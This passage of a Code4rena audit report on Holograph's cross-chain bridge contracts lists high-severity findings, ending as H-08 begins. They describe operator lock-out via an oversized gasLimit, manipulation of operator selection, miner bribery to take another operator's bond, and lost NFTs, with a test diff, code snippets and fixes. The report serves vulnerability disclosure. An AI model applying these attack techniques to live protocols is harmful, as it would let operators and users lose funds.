---
sponsor: "Holograph"
slug: "2022-10-holograph"
date: "2022-12-15"  
title: "Holograph contest"
findings: "https://github.com/code-423n4/2022-10-holograph-findings/issues"
contest: 170
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit contest outlined in this document, C4 conducted an analysis of the Holograph smart contract system written in Solidity. The audit contest took place between October 18—October 25 2022.

## Wardens

147 Wardens contributed reports to the Holograph contest:

  1. [Trust](https://twitter.com/trust__90)
  1. 0xA5DF
  1. Lambda
  1. 0x52
  1. ladboy233
  1. rbserver
  1. [securerodd](https://twitter.com/securerodd)
  1. [bin2chen](https://twitter.com/bin2chen)
  1. [adriro](https://github.com/romeroadrian)
  1. [Chom](https://chom.dev)
  1. eighty
  1. Rolezn
  1. [Jeiwan](https://jeiwan.net)
  1. [oyc\_109](https://twitter.com/andyfeili)
  1. d3e4
  1. V\_B (Barichek and vlad\_bochok)
  1. [0xSmartContract](https://twitter.com/0xSmartContract)
  1. RaymondFam
  1. [csanuragjain](https://twitter.com/csanuragjain)
  1. [Deivitto](https://twitter.com/Deivitto)
  1. rotcivegaf
  1. [0xNazgul](https://twitter.com/0xNazgul)
  1. lukris02
  1. [Picodes](https://twitter.com/thePicodes)
  1. cryptphi
  1. \_\_141345\_\_
  1. Bnke0x0
  1. RedOneN
  1. ajtra
  1. Diana
  1. [m\_Rassska](https://t.me/Road220)
  1. m9800
  1. halden
  1. karanctf
  1. peanuts
  1. [Aymen0909](https://github.com/Aymen1001)
  1. ctf\_sec
  1. imare
  1. [martin](https://github.com/martin-petrov03)
  1. B2
  1. ch0bu
  1. cryptostellar5
  1. delfin454000
  1. erictee
  1. [fatherOfBlocks](https://twitter.com/father0fBl0cks)
  1. KoKo
  1. leosathya
  1. mcwildy
  1. ReyAdmirado
  1. [saneryee](https://medium.com/@saneryee-studio)
  1. [svskaushik](https://twitter.com/svs_kaushik)
  1. Waze
  1. [joestakey](https://twitter.com/JoeStakey)
  1. cccz
  1. cdahlheimer
  1. brgltd
  1. 0xZaharina
  1. aysha
  1. bobirichman
  1. [catchup](https://twitter.com/catchup22)
  1. djxploit
  1. mics
  1. [nicobevi](https://github.com/nicobevilacqua)
  1. sakshamguruji
  1. [8olidity](https://twitter.com/8olidity)
  1. Josiah
  1. pedr02b2
  1. rvierdiiev
  1. Dinesh11G
  1. vv7
  1. 0x1f8b
  1. 0xsam
  1. [durianSausage](https://github.com/lyciumlee)
  1. exolorkistis
  1. gianganhnguyen
  1. [gogo](https://www.linkedin.com/in/georgi-nikolaev-georgiev-978253219)
  1. hxzy
  1. i\_got\_hacked
  1. iepathos
  1. [JC](https://twitter.com/sm4rtcontr4ct)
  1. [JrNet](https://twitter.com/JagadeshRonanki)
  1. Jujic
  1. Mathieu
  1. Metatron
  1. Mukund
  1. peiw
  1. Pheonix
  1. [ret2basic](https://twitter.com/ret2basic)
  1. ryshaw
  1. Saintcode\_
  1. sakman
  1. [Satyam\_Sharma](https://twitter/@Satyam33sharma)
  1. Shinchan ([Sm4rty](https://twitter.com/Sm4rty_), [prasantgupta52](https://twitter.com/prasantgupta52), and [Rohan16](https://twitter.com/rohan16___))
  1. [Tomio](https://twitter.com/meidhiwirara)
  1. [zishansami](https://zishansami102.github.io/)
  1. minhtrng
  1. arcoun
  1. [nadin](https://twitter.com/nadin20678790)
  1. [teawaterwire](https://twitter.com/teawaterwire)
  1. 2997ms
  1. ballx
  1. chaduke
  1. pashov
  1. Yiko
  1. 0x040
  1. 0x5rings
  1. 0xzh
  1. Amithuddar
  1. beardofginger
  1. bulej93
  1. catwhiskeys
  1. chrisdior4
  1. [cylzxje](https://twitter.com/cylzxje)
  1. [dharma09](https://twitter.com/im_Dharma09)
  1. emrekocak
  1. [Franfran](https://franfran.dev/)
  1. KingNFT
  1. lucacez
  1. lyncurion
  1. Olivierdem
  1. PaludoX0
  1. sikorico
  1. skyle
  1. Tagir2003
  1. tnevler
  1. w0Lfrum
  1. [Rahoz](https://www.linkedin.com/in/nhan-vo-a9473019a/)
  1. RaoulSchaffranek
  1. [seyni](https://twitter.com/seynixyz)
  1. 0xhunter
  1. [a12jmx](https://twitter.com/a12jmx)
  1. caventa
  1. cloudjunky
  1. Diraco
  1. [Dravee](https://twitter.com/BowTiedDravee)
  1. francoHacker
  1. [hansfriese](https://twitter.com/hansfriese)
  1. [ignacio](https://twitter.com/0xheynacho)
  1. kv
  1. louhk
  1. malinariy
  1. Margaret
  1. [Migue](https://twitter.com/angel_tripi)
  1. [Ocean\_Sky](https://twitter.com/bluenights004)

This contest was judged by [gzeon](https://twitter.com/gzeon).

Final report assembled by [liveactionllama](https://twitter.com/liveactionllama).

# Summary

The C4 analysis yielded an aggregated total of 27 unique vulnerabilities. Of these vulnerabilities, 8 received a risk rating in the category of HIGH severity and 19 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 113 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 99 reports recommending gas optimizations.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 Holograph contest repository](https://github.com/code-423n4/2022-10-holograph), and is composed of 10 smart contracts written in the Solidity programming language and includes 2,614 lines of Solidity code.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities according to a methodology based on [OWASP standards](https://owasp.org/www-community/OWASP_Risk_Rating_Methodology).

Vulnerabilities are divided into three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

Further information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com).

# High Risk Findings (8)
## [[H-01] An attacker can lock operator out of the pod by setting gas limit that's higher than the block gas limit of dest chain](https://github.com/code-423n4/2022-10-holograph-findings/issues/414)
*Submitted by 0xA5DF, also found by 0x52*

[HolographOperator.sol#L415](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L415)<br>

When a beaming job is executed, there's a requirement that the gas left would be at least as the `gasLimit` set by the user.
Given that there's no limit on the `gasLimit` the user can set, a user can set the `gasLimit` to amount that's higher than the block gas limit on the dest chain, causing the operator to fail to execute the job.

### Impact

Operators would be locked out of the pod, unable to execute any more jobs and not being able to get back the bond they paid.

The attacker would have to pay a value equivalent to the gas fee if that amount was realistic (i.e. `gasPrice` &ast; `gasLimit` in dest chain native token), but this can be a relative low amount for Polygon and Avalanche chain (for Polygon that's 20M gas limit and `200 Gwei gas = 4 Matic`, for Avalanche the block gas limit seems to be 8M and the price `~30 nAVAX = 0.24 AVAX`). Plus, the operator isn't going to receive that amount.

### Proof of Concept

The following test demonstrates this scenario:

```diff
diff --git a/test/06_cross-chain_minting_tests_l1_l2.ts b/test/06_cross-chain_minting_tests_l1_l2.ts
index 1f2b959..a1a23b7 100644
--- a/test/06_cross-chain_minting_tests_l1_l2.ts
+++ b/test/06_cross-chain_minting_tests_l1_l2.ts
@@ -276,6 +276,7 @@ describe('Testing cross-chain minting (L1 & L2)', async function () {
             gasLimit: TESTGASLIMIT,
           })
         );
+        estimatedGas = BigNumber.from(50_000_000);
         // process.stdout.write('\n' + 'gas estimation: ' + estimatedGas.toNumber() + '\n');
 
         let payload: BytesLike = await l1.bridge.callStatic.getBridgeOutRequestPayload(
@@ -303,7 +304,8 @@ describe('Testing cross-chain minting (L1 & L2)', async function () {
             '0x' + remove0x((await l1.operator.getMessagingModule()).toLowerCase()).repeat(2),
             payload
           );
-
+        estimatedGas = BigNumber.from(5_000_000);
+        
         process.stdout.write(' '.repeat(10) + 'expected lz gas to be ' + executeJobGas(payload, true).toString());
         await expect(
           adminCall(l2.mockLZEndpoint.connect(l2.lzEndpoint), l2.lzModule, 'lzReceive', [
@@ -313,7 +315,7 @@ describe('Testing cross-chain minting (L1 & L2)', async function () {
             payload,
             {
               gasPrice: GASPRICE,
-              gasLimit: executeJobGas(payload),
+              gasLimit: 5_000_000,
             },
           ])
         )
```

The test would fail with the following output:

      1) Testing cross-chain minting (L1 & L2)
           Deploy cross-chain contracts via bridge deploy
             hToken
               deploy l1 equivalent on l2:
         VM Exception while processing transaction: revert HOLOGRAPH: not enough gas left

### Recommended Mitigation Steps

Limit the `gasLimit` to the maximum realistic amount that can be used on the dest chain (including the gas used up to the point where it's checked).

**[ACC01ADE (Holograph) confirmed and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/414#issuecomment-1308900212):**
 > Good idea to generally limit the maximum gas allowed in an operator job.
>
 > [Feature/HOLO-604: implementing critical issue fixes](https://github.com/holographxyz/holograph-protocol/pull/84)



***

## [[H-02] If user sets a low `gasPrice` the operator would have to choose between being locked out of the pod or executing the job anyway](https://github.com/code-423n4/2022-10-holograph-findings/issues/364)
*Submitted by 0xA5DF, also found by cryptphi, Jeiwan, and Picodes*

[HolographOperator.sol#L202-L340](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/HolographOperator.sol#L202-L340)<br>
[HolographOperator.sol#L593-L596](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L593-L596)<br>
[LayerZeroModule.sol#L277-L294](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/module/LayerZeroModule.sol#L277-L294)<br>

During the beaming process the user compensates the operator for the gas he has to pay by sending some source-chain-native-tokens via `hToken`.<br>
The amount he has to pay is determined according to the `gasPrice` set by the user, which is supposed to be the maximum gas price to be used on dest chain (therefore predicting the max gas fee the operator would pay and paying him the same value in src chain native tokens).<br>
However, in case the user sets a low price (as low as 1 wei) the operator can't skip the job because he's locked out of the pod till he executes the job.<br>
The operator would have to choose between loosing money by paying a higher gas fee than he's compensated for or being locked out of the pod - not able to execute additional jobs or get back his bonded amount.<br>

### Impact

Operator would be losing money by having to pay gas fee that's higher than the compensation (gas fee can be a few dozens of USD for heavy txs).<br>
This could also be used by attackers to make operators pay for the attackers' expensive gas tasks:

*   They can deploy their own contract as the 'source contract'
*   Use the `bridgeIn` event and the `data` that's being sent to it to instruct the source contract what operations need to be executed
*   They can use it for execute operations where the `tx.origin` doesn't matter (e.g. USDc gasless send)

### Proof of Concept

*   An operator can't execute any further jobs or leave the pod till the job is executed. From [the docs](https://docs.holograph.xyz/holograph-protocol/operator-network-specification#:\~:text=When%20an%20operator%20is%20selected%20for%20a%20job%2C%20they%20are%20temporarily%20removed%20from%20the%20pod%2C%20until%20they%20complete%20the%20job.%20If%20an%20operator%20successfully%20finalizes%20a%20job%2C%20they%20earn%20a%20reward%20and%20are%20placed%20back%20into%20their%20selected%20pod.):

> When an operator is selected for a job, they are temporarily removed from the pod, until they complete the job. If an operator successfully finalizes a job, they earn a reward and are placed back into their selected pod.

*   Operator can't skip a job. Can't prove a negative but that's pretty clear from reading the code.
*   There's indeed a third option - that some other operator/user would execute the job instead of the selected operator, but a) the operator would get slashed for that. b) If the compensation is lower than the gas fee then other users have no incentive to execute it as well.

### Recommended Mitigation Steps

Allow operator to opt out of executing the job if the `gasPrice` is higher than the current gas price.

**[alexanderattar (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/364#issuecomment-1306348781):**
 > Is a known issue, and we will be fixing it.

**[alexanderattar (Holograph) resolved](https://github.com/code-423n4/2022-10-holograph-findings/issues/364):**
 > [Feature/HOLO-604: implementing critical issue fixes](https://github.com/holographxyz/holograph-protocol/pull/84)



***

## [[H-03]  LayerZeroModule miscalculates gas, risking loss of assets](https://github.com/code-423n4/2022-10-holograph-findings/issues/445)
*Submitted by Trust*

[LayerZeroModule.sol#L431-L445](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/module/LayerZeroModule.sol#L431-L445)<br>

Holograph gets its cross chain messaging primitives through Layer Zero. To get pricing estimate, it uses the DstConfig price struct exposed in LZ's [RelayerV2](https://github.com/LayerZero-Labs/LayerZero/blob/main/contracts/RelayerV2.sol#L133).

The issue is that the important baseGas and gasPerByte configuration parameters, which are used to calculate a custom amount of gas for the destination LZ message, use the values that come from the *source* chain. This is in contrast to LZ which handles DstConfigs in a mapping keyed by chainID.  The encoded gas amount is described [here](https://layerzero.gitbook.io/docs/guides/advanced/relayer-adapter-parameters).

### Impact

The impact is that when those fields are different between chains, one of two things may happen:

1.  Less severe - we waste excess gas, which is refunded to the lzReceive() caller (Layer Zero)
2.  More severe - we underprice the delivery cost, causing lzReceive() to revert and the NFT stuck in limbo forever.

The code does not handle a failed lzReceive (differently to a failed executeJob). Therefore, no failure event is emitted and the NFT is screwed.

### Recommended Mitigation Steps

Firstly, make sure to use the target gas costs.<br>
Secondly, re-engineer lzReceive to be fault-proof, i.e. save some gas to emit result event.

**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/445#issuecomment-1297075073):**
 > Might also cause the LZ channel to stuck [`#244`](https://github.com/code-423n4/2022-10-holograph-findings/issues/244).

**[ACC01ADE (Holograph) disputed and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/445#issuecomment-1308865449):**
 > I respectfully disagree that this is even a valid issue.<br>
> @Trust - please re-review the affected code. You'll notice that we are in fact extracting destination chain gas data. And if you review the 100s of cross-chain testnet transactions that we have already made with that version of code, you will notice that the math is exact.
>
 > Maybe I am misunderstanding something, so some clarification would be great if you think I'm wrong on this.

**[Trust (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/445#issuecomment-1308879405):**
 > Please take a look at `LayerZeroModule.sol`'s send function:
> ```
> function send(
>   uint256, /* gasLimit*/
>   uint256, /* gasPrice*/
>   uint32 toChain,
>   address msgSender,
>   uint256 msgValue,
>   bytes calldata crossChainPayload
> ) external payable {
>   require(msg.sender == address(_operator()), "HOLOGRAPH: operator only call");
>   LayerZeroOverrides lZEndpoint;
>   assembly {
>     lZEndpoint := sload(_lZEndpointSlot)
>   }
>   // need to recalculate the gas amounts for LZ to deliver message
>   lZEndpoint.send{value: msgValue}(
>     uint16(_interfaces().getChainId(ChainIdType.HOLOGRAPH, uint256(toChain), ChainIdType.LAYERZERO)),
>     abi.encodePacked(address(this), address(this)),
>     crossChainPayload,
>     payable(msgSender),
>     address(this),
>     abi.encodePacked(uint16(1), uint256(_baseGas() + (crossChainPayload.length * _gasPerByte())))
>   );
> }
> ```
> 
> The function uses `_baseGas()` and `_gasPerByte()` as the relayer adapter parameters as described in the submission description's link. These two getters are global for all chains.
> 
> I agree that the `getMessage()` function takes into account the correct fees for the destination chain.

**[ACC01ADE (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/445#issuecomment-1308924550):**
 > @Trust - Ya but these refer to destination gas limits. BaseGas and GasPerByte is the amount of gas that is used by the `crossChainMessage` function that LayerZero triggers on cross-chain call [HolographOperator.sol#L484](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L484)

**[ACC01ADE (Holograph) confirmed and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/445#issuecomment-1308953994):**
 > Discussed this in more detail with @Trust, definitely a critical issue.<br>
> Need to add destination chain-specific `_baseGas` and `_gasPerByte` to mitigate EVM differences in opcode costs.

**[alexanderattar (Holograph) resolved](https://github.com/code-423n4/2022-10-holograph-findings/issues/445#event-7816582320):**
 > [Feature/HOLO-604: implementing critical issue fixes](https://github.com/holographxyz/holograph-protocol/pull/84)



***

## [[H-04] An attacker can manipulate each pod and gain an advantage over the remainder Operators](https://github.com/code-423n4/2022-10-holograph-findings/issues/168)
*Submitted by eighty, also found by d3e4, eighty, Lambda, and eighty*

In [contracts/HolographOperator.sol#crossChainMessage](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L484-L539), each Operator is selected by:

*   Generating a random number ([L499](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L499))
*   A pod is selected by dividing the random with the total number of pods, and using the remainder ([L503](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L503))
*   An Operator of the selected pod is chosen using the **same** random and dividing by the total number of operators ([L511](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L511)).

This creates an unintended bias since the first criterion (the `random`) is used for both selecting the pod and selecting the Operator, as explained in a previous issue (`M001-Biased distribution`). In this case, an attacker knowing this flaw can continuously monitor the contracts state and see the current number of pods and Operators. Accordingly to the [documentation](https://docs.holograph.xyz/holograph-protocol/operator-network-specification#operator-job-selection) and provided [flow](https://github.com/code-423n4/2022-10-holograph/blob/main/docs/IMPORTANT_FLOWS.md#joining-pods):

*   An Operator can easily join and leave a pod, albeit when leaving a small fee is paid
*   An Operator can only join one pod, but an attacker can control multiple Operators
*   The attacker can then enter and leave a pod to increase (unfairly) his odds of being selected for a job

Honest Operators may feel compelled to leave the protocol if there are no financial incentives (and lose funds in the process), which can also increase the odds of leaving the end-users at the hands of a malicious Operator.

### Proof of Concept

Consider the following simulation for 10 pods with a varying number of operators follows (X → "does not apply"):

| Pod n | Pon len | Op0 | Op1 | Op2 | Op3 | Op4 | Op5 | Op6 | Op7 | Op8 | Op9 | Total Pod |
| ----- | ------- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --------- |
| P0    | 10      | 615 | 0   | 0   | 0   | 0   | 0   | 0   | 0   | 0   | 0   | 615       |
| P1    | 3       | 203 | 205 | 207 | X   | X   | X   | X   | X   | X   | X   | 615       |
| P2    | 6       | 208 | 0   | 233 | 0   | 207 | 0   | X   | X   | X   | X   | 648       |
| P3    | 9       | 61  | 62  | 69  | 70  | 65  | 69  | 61  | 60  | 54  | X   | 571       |
| P4    | 4       | 300 | 0   | 292 | 0   | X   | X   | X   | X   | X   | X   | 592       |
| P5    | 10      | 0   | 0   | 0   | 0   | 0   | 586 | 0   | 0   | 0   | 0   | 586       |
| P6    | 2       | 602 | 0   | X   | X   | X   | X   | X   | X   | X   | X   | 602       |
| P7    | 7       | 93  | 93  | 100 | 99  | 76  | 74  | 78  | X   | X   | X   | 613       |
| P8    | 2       | 586 | 0   | X   | X   | X   | X   | X   | X   | X   | X   | 586       |
| P9    | 6       | 0   | 190 | 0   | 189 | 0   | 192 | X   | X   | X   | X   | 571       |

At this stage, an attacker Mallory joins the protocol and scans the protocol (or interacts with - e.g. `getTotalPods`, `getPodOperatorsLength`). As an example, after considering the potential benefits, she chooses pod `P9` and sets up some bots `[B1, B2, B3]`. The number of Operators will determine the odds, so:

| Pod P9 | Alt len | Op0 | Op1 | Op2 | Op3 | Op4 | Op5 | Op6 | Op7 | Op8 | Op9 | Total Pod |
| ------ | ------- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --------- |
| P9A    | 4       | 0   | 276 | 0   | 295 | X   | X   | X   | X   | X   | X   | 571       |
| P9B    | 5       | 0   | 0   | 0   | 0   | 571 | X   | X   | X   | X   | X   | 571       |
| P9     | 6       | 0   | 190 | 0   | 189 | 0   | 192 | X   | X   | X   | X   | 571       |
| P9C    | 7       | 66  | 77  | 81  | 83  | 87  | 90  | 87  | X   | X   | X   | 571       |
| P9D    | 8       | 0   | 127 | 0   | 147 | 0   | 149 | 0   | 148 | X   | X   | 571       |

And then:

1.  She waits for the next job to fall in `P9` and keeps an eye on the number of pods, since it could change the odds.
2.  After an Operator is selected (he [pops](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L518) from the array), the number of available Operators change to 5, and the odds change to `P9B`.
3.  She deploys `B1` and it goes to position `Op5`, odds back to `P9`. If the meantime the previously chosen Operator comes back to the `pod`, see the alternative timeline.
4.  She now has 1/3 of the probability to be chosen for the next job:

4.1 If she is not chosen, [she will assume the position](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L1138-L1144) of the chosen Operator, and deploys `B2` to maintain the odds of `P9` and controls 2/3 of the pod.
4.2 If she is chosen, she chooses between employing another bot or waiting to execute the job to back to the pod (keeping the original odds).
5\. She can then iterate multiple times to swap to the remainder of possible indexes via step 4.1.

Alternative timeline (from previous 3.):

1.  The chosen Operator finishes the job and goes back to the pod. Now there's 7 members with uniform odds (`P9C`).
2.  Mallory deploys `B2` and the length grows to 8, the odds turn to `P9D` and she now controls two of the four possible indexes from which she can be chosen.

There are a lot of ramifications and possible outcomes that Mallory can manipulate to increase the odds of being selected in her favor.

### Recommended Mitigation Steps

As stated in [`M001-Biased distribution`](https://github.com/code-423n4/2022-10-holograph-findings/issues/167), use two random numbers for pod and Operator selection. Ideally, an independent source for randomness should be used, but following the assumption that the one used in [L499](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L499) is safe enough, using the most significant bits (e.g. `random >> 128`) should guarantee an unbiased distribution. Also, reading the [EIP-4399](https://eips.ethereum.org/EIPS/eip-4399) could be valuable.

Additionally, since randomness in blockchain is always tricky to achieve without an oracle provider, consider adding additional controls (e.g. waiting times before joining each pod) to increase the difficulty of manipulating the protocol.

And finally, in this particular case, removing the swapping mechanism (moving the last index to the chosen operator's current index) for another mechanism (shifting could also create conflicts [with backup operators?](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L358-L370)) could also increase the difficulty of manipulating a particular pod.

**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/168#issuecomment-1296307048):**
 > Considering this as duplicate of [`#169`](https://github.com/code-423n4/2022-10-holograph-findings/issues/169) since they share the same root cause.

**[ACC01ADE (Holograph) confirmed and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/168#issuecomment-1308950227):**
 > Really love this analysis!

**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/168#issuecomment-1320926135):**
 > Judging this as high risk due to possible manipulation.

**[Trust (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/168#issuecomment-1321830898):**
 > Agree this is a high severity find. Believe issue [`#167`](https://github.com/code-423n4/2022-10-holograph-findings/issues/167) and this one are essentially different exploits of the same flaw and therefore should be bulked.<br>
> Relevant org discussion [here](https://github.com/code-423n4/org/issues/8).

**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/168#issuecomment-1328123349):**
 > Agreed.



***

## [[H-05] MEV: Operator can bribe miner and steal honest operator's bond amount if gas price went high](https://github.com/code-423n4/2022-10-holograph-findings/issues/473)
*Submitted by Trust*

[HolographOperator.sol#L354](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L354)<br>

Operators in Holograph do their job by calling executeJob() with the bridged in bytes from source chain.<br>
If the primary job operator did not execute the job during his allocated block slot, he is punished by taking a single bond amount and transfer it to the operator doing it instead.<br>
The docs and code state that if there was a gas spike in the operator's slot, he shall not be punished. The way a gas spike is checked is with this code in executeJob:

    require(gasPrice >= tx.gasprice, "HOLOGRAPH: gas spike detected");

However, there is still a way for operator to claim primary operator's bond amount although gas price is high. Attacker can submit a flashbots bundle including the executeJob() transaction, and one additional "bribe" transaction. The bribe transaction will transfer some incentive amount to coinbase address (miner), while the executeJob is submitted with a low gasprice. Miner will accept this bundle as it is overall rewarding enough for them, and attacker will receive the base bond amount from victim operator. This threat is not theoretical because every block we see MEV bots squeezing value from such opportunities.

info about coinbase [transfer](https://docs.flashbots.net/flashbots-auction/searchers/advanced/coinbase-payment)<br>
info about bundle [selection](https://docs.flashbots.net/flashbots-auction/searchers/advanced/bundle-pricing#bundle-ordering-formula)

### Impact

Dishonest operator can take honest operator's bond amount although gas price is above acceptable limits.

### Tools Used

Manual audit, flashbot docs

### Recommended Mitigation Steps

Do not use current tx.gasprice amount to infer gas price in a previous block.<br>
Probably best to use gas price oracle.

**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/473#issuecomment-1297061061):**
 > Note that this is not possible with 1559 due to block base fee, but might be possible in some other chain.

**[alexanderattar (Holograph) disputed and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/473#issuecomment-1306625799):**
 > EIP-1559 does not allow for tx gas less than block base fee

**[Trust (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/473#issuecomment-1306728092):**
 > Dispute: it is incorrect to assume bridge request sender did not add a priority fee, making it possible to bribe with `tx.gasprice < gasPrice`.<br>
> Also, cannot assume all chains in the multichain implement EIP1559.

**[ACC01ADE (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/473#issuecomment-1308918221):**
 > The EIP-1559 for all EVM chains assumption is the gotcha here. I don't really see a solution for this at the moment. 🤔 



***

## [[H-06] Gas price spikes cause the selected operator to be vulnerable to frontrunning and be slashed](https://github.com/code-423n4/2022-10-holograph-findings/issues/44)
*Submitted by Chom, also found by Lambda and Trust*

[HolographOperator.sol#L354](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L354)<br>

```solidity
require(gasPrice >= tx.gasprice, "HOLOGRAPH: gas spike detected");
```

```solidity
        /**
         * @dev select operator that failed to do the job, is slashed the pod base fee
         */
        _bondedAmounts[job.operator] -= amount;
        /**
         * @dev the slashed amount is sent to current operator
         */
        _bondedAmounts[msg.sender] += amount;
```

Since you have designed a mechanism to prevent other operators to slash the operator due to "the selected missed the time slot due to a gas spike". It can induce that operators won't perform their job if a gas price spike happens due to negative profit.

But your designed mechanism has a vulnerability. Other operators can submit their transaction to the mempool and queue it using `gasPrice in bridgeInRequestPayload`. It may get executed before the selected operator as the selected operator is waiting for the gas price to drop but doesn't submit any transaction yet. If it doesn't, these operators lose a little gas fee. But a slashed reward may be greater than the risk of losing a little gas fee.

```solidity
require(timeDifference > 0, "HOLOGRAPH: operator has time");
```

Once 1 epoch has passed, selected operator is vulnerable to slashing and frontrunning.

### Recommended Mitigation Steps

Modify your operator node software to queue transactions immediately with `gasPrice in bridgeInRequestPayload` if a gas price spike happened. Or allow gas fee loss tradeoff to prevent being slashed.

**[alexanderattar (Holograph) confirmed and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/44#issuecomment-1307886755):**
 > Valid, we have not fully finalized this mechanism and will consider mitigation strategies.

**[gzeon (judge) increased severity to High and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/44#issuecomment-1320927380):**
 > High risk because potential slashing.



***

## [[H-07] Failed job can't be recovered. NFT may be lost.](https://github.com/code-423n4/2022-10-holograph-findings/issues/102)
*Submitted by Chom, also found by 0x52, 0xA5DF, adriro, and ladboy233*

[HolographOperator.sol#L329](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L329)<br>
[HolographOperator.sol#L419-L429](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L419-L429)<br>

```solidity
function executeJob(bytes calldata bridgeInRequestPayload) external payable {
...
delete _operatorJobs[hash];
...
    try
      HolographOperatorInterface(address(this)).nonRevertingBridgeCall{value: msg.value}(
        msg.sender,
        bridgeInRequestPayload
      )
    {
      /// @dev do nothing
    } catch {
      _failedJobs[hash] = true;
      emit FailedOperatorJob(hash);
    }
}
```

First, it will `delete _operatorJobs[hash];` to have it not replayable.

Next, assume `nonRevertingBridgeCall` failed. NFT won't be minted and the catch block is entered.

`_failedJobs[hash]` is set to true and event is emitted

Notice that `_operatorJobs[hash]` has been deleted, so this job is not replayable. This mean NFT is lost forever since we can't retry executeJob.

### Recommended Mitigation Steps

Move `delete _operatorJobs[hash];` to the end of function executeJob covered in `if (!_failedJobs[hash])`

```solidity
...
if (!_failedJobs[hash]) delete _operatorJobs[hash];
...
```

But this implementation is not safe. The selected operator may get slashed. Additionally, you may need to check `_failedJobs` flag to allow retry for only the selected operator.

**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/102#issuecomment-1296298124):**
 > While the use of non-blocking call is good to unstuck operator, consider making the failed job still executable by anyone (so the user can e.g. use a higher gas limit) to avoid lost fund. Kinda like how Arbitrum retryable ticket works. Can be high risk due to asset lost.

**[Trust (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/102#issuecomment-1296346691):**
 > I think it's a design choice to make it not replayable. Sponsor discussed having a refund mechanism at the source chain, if we were to leave it replayable the refunding could lead to double mint attack.

**[alexanderattar (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/102#issuecomment-1307872286):**
 > This is a valid point and the desired code is planned but wasn't implemented in time for the audit. We will add logic to handle this case.

**[gzeon (judge) increased severity to High and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/102#issuecomment-1320929853):**
 > Since asset can be lost, I think it is fair to judge this as High risk.

**[alexanderattar (Holograph) resolved and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/102#issuecomment-1351772822):**
 > We have a fix for this: https://github.com/holographxyz/holograph-protocol/pull/98/files#diff-552f4c851fa3089f9c8efd33a2f10681bc27743917bb63000a5d19d5b41e0d3f



***

## [[H-08] Gas limit check is inaccurate, leading to an operator being able to fail a job intentionally](https://github.com/code-423n4/2022-10-holograph-findings/issues/176)
*Submitted by 0xA5DF, also found by Trust and V\_B*

[HolographOperator.sol#L316](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/HolographOperator.sol#L316)<br>

